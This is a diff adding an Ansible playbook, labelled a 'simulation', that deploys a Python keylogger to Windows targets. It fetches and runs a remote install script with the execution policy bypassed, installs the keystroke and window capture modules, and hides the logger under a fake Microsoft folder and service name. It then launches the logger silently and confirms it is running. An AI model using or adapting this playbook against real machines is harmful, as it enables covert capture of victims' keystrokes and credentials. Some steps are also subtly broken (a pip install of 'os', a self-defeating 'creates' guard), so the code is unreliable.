@@ -1,0 +1,44 @@
+# Author: Winter Sager wrs9226@g.rit.edu
+---
+- name: Deploy Targeted Python Logger Simulation
+  hosts: windows_targets
+  gather_facts: yes
+
+  tasks:
+    - name: Ensure Chocolatey is installed
+      win_shell: |
+        Set-ExecutionPolicy Bypass -Scope Process -Force;
+        [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072;
+        iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+      args:
+        creates: C:\ProgramData\chocolatey\bin\choco.exe
+
+    - name: Install Python 3
+      win_chocolatey:
+        name: python3
+        state: present
+
+    - name: Install required Python modules (pynput, pygetwindow, os)
+      win_shell: python -m pip install pynput pygetwindow os
+
+    - name: Create hidden folder for the tool and logs
+      win_file:
+        path: C:\Users\Public\Documents\Microsoft\Vault
+        state: directory
+
+    - name: Copy the Python script to target
+      win_copy:
+        src: ./targeted_logger.pyw
+        dest: C:\Users\Public\Documents\Microsoft\Vault\vault_svc.pyw
+
+    - name: Start the logger in the background (Silent)
+      win_shell: |
+        Start-Process "pythonw.exe" -ArgumentList "C:\Users\Public\Documents\Microsoft\Vault\vault_svc.pyw"
+      args:
+        # Prevents the task from hanging by running the process independently
+        creates: C:\Users\Public\Documents\Microsoft\Vault\vault_svc.pyw
+
+    - name: Verify process is running
+      win_shell: Get-Process pythonw -ErrorAction SilentlyContinue
+      register: process_check
+      failed_when: process_check.rc != 0
